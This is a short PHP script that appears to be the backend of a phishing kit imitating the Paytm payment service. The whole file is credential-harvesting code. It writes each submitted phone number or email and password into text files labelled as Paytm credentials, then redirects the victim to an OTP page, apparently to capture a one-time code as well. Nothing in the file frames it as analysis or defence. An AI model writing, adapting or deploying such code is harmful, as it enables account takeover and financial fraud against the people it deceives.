<?php

file_put_contents("usernames.txt", "Paytm Phone number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Paytm Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
